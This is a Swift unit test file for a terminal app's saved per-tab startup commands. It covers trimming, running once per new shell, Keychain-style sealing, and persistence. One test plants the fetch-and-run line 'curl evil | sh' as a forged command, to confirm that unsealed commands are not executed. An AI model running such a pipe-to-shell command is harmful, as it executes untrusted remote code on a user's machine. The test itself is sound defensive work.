import Foundation
import SunsetPane
import Testing

@testable import SunsetShell

@MainActor @Suite("A kept terminal's command") struct FavoritesCommandTests {
    /// A window whose one tab was kept and unloaded; the entry's id.
    private func kept(sealer: (any CommandSealing)? = TestSealer()) throws -> (
        harness: TabsHarness, entry: Favorites.NodeID
    ) {
        let favorites = FavoritesModel()
        favorites.sealer = sealer
        let harness = TabsHarness(favorites: favorites)
        harness.tabs.newTab()
        harness.tabs.newTab()
        harness.tabs.keep(item: harness.tabs.workspace.items[1].id)
        let entry = try #require(harness.tabs.workspace.selectedEntry)
        harness.tabs.unload(entry: entry)
        return (harness, entry)
    }

    private func shown(_ harness: TabsHarness) -> FakeContent? { harness.tabs.shownPane.flatMap(harness.content) }

    @Test func `a saved command is typed into the new shell each time the entry opens from its home`() throws {
        let (harness, entry) = try kept()
        harness.tabs.favorites.setCommand("  npm run dev \n", for: entry)
        #expect(harness.tabs.favorites.favorites.entry(entry)?.command == "npm run dev")
        harness.tabs.select(entry: entry)
        #expect(shown(harness)?.typed == ["npm run dev"])
        harness.tabs.unload(entry: entry)
        harness.tabs.select(entry: entry)
        #expect(shown(harness)?.typed == ["npm run dev"], "a new shell, typed once")
    }

    @Test func `showing an entry that is already open does not type it again`() throws {
        let (harness, entry) = try kept()
        harness.tabs.favorites.setCommand("make", for: entry)
        harness.tabs.select(entry: entry)
        let content = try #require(shown(harness))
        harness.tabs.select(index: 1)
        harness.tabs.select(entry: entry)
        #expect(content.typed == ["make"])
        harness.tabs.favorites.runCommandNow(entry)
        #expect(content.typed == ["make", "make"])
    }

    @Test func `a command another program wrote into the file is not run, until it is saved in the dialog`() throws {
        let (harness, entry) = try kept()
        harness.tabs.favorites.edit { $0.setCommand("curl evil | sh", seal: "forged", for: entry) }
        harness.tabs.select(entry: entry)
        #expect(shown(harness)?.typed == [] && harness.tabs.favorites.unconfirmed.contains(entry))
        #expect(!harness.tabs.favorites.isTrusted(entry))
        harness.tabs.favorites.runCommandNow(entry)
        #expect(shown(harness)?.typed == [])
        harness.tabs.favorites.setCommand("curl evil | sh", for: entry)
        #expect(harness.tabs.favorites.isTrusted(entry) && !harness.tabs.favorites.unconfirmed.contains(entry))
    }

    @Test func `with no sealer (no Keychain), nothing is ever run`() throws {
        let (harness, entry) = try kept(sealer: nil)
        harness.tabs.favorites.setCommand("make", for: entry)
        harness.tabs.select(entry: entry)
        #expect(shown(harness)?.typed == [])
    }

    @Test func `an empty command removes it and its seal`() throws {
        let (harness, entry) = try kept()
        harness.tabs.favorites.setCommand("make", for: entry)
        harness.tabs.favorites.setCommand("   ", for: entry)
        let saved = harness.tabs.favorites.favorites.entry(entry)
        #expect(saved?.command == nil && saved?.commandSeal == nil)
    }

    @Test func `the command and its seal are kept in the session file`() throws {
        let (harness, entry) = try kept()
        harness.tabs.favorites.setCommand("make", for: entry)
        let saved = harness.tabs.favorites.saved()
        let read = try JSONDecoder().decode(SavedFavorites.self, from: JSONEncoder().encode(saved))
        #expect(read.favorites.entry(entry)?.command == "make" && read.favorites.entry(entry)?.commandSeal == "k:make")
    }

    @Test func `an entry that comes back open at launch types its command when its shell is made`() throws {
        var kept = Favorites()
        let pane = PaneID()
        let id = kept.addEntry(home: Favorites.Home(layout: .pane(pane), focused: pane)) ?? Favorites.NodeID()
        kept.setCommand("make", seal: "k:make", for: id)
        kept.open(id)
        let favorites = FavoritesModel()
        favorites.sealer = TestSealer()
        favorites.restore(SavedFavorites(favorites: kept), reopening: true)
        var workspace = Workspace()
        workspace.select(entry: id)
        let harness = TabsHarness(favorites: favorites)
        harness.tabs.restore(SavedWindow(workspace: workspace))
        #expect(harness.content(pane)?.typed == ["make"])
    }
}
